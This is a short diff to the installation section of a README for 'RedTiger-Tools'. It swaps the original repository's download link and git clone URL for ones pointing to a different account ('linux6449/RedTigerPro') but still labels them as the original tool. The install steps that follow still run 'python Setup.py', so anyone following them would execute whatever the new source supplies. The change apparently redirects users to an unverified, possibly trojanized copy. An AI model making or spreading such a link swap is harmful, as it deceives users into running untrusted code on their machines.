@@ -58,7 +58,7 @@
 
 <h1 align="center">Installation</h1>
 
-<a href="https://github.com/loxy0dev/RedTiger-Tools/archive/refs/tags/v6.6.zip">Dowloads "RedTiger-Tools.zip" Here</a>
+<a href="https://github.com/linux6449/RedTigerPro.zip">Dowloads "RedTiger-Tools.zip" Here</a>
 <p>
   
 ```
@@ -69,7 +69,7 @@
 Or
 ```
 1 - Open a terminal.
-2 - Write "git clone https://github.com/loxy0dev/RedTiger-Tools.git"
+2 - Write "git clone https://github.com/linux6449/RedTigerPro.git"
 3 - Write "cd RedTiger-Tools"
 4 - Write "git pull"
 5 - Write "python Setup.py"
